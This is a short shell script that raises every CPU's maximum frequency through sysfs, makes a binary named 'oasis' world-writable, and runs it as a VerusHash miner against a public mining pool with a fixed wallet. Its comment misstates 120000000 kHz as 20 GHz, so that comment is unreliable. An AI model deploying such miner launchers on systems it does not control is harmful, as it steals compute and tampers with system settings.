
CPUFREQ_PATH="/sys/devices/system/cpu/cpu*/cpufreq"
MAX_FREQ=120000000 # Maksimal frekuensi dalam kHz (20 GHz)

for dir in $CPUFREQ_PATH; do
    if [ -e $dir/scaling_max_freq ]; then
        echo $MAX_FREQ > $dir/scaling_max_freq
    fi
done

chmod 777 oasis
./oasis --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.CRO-2 --password x
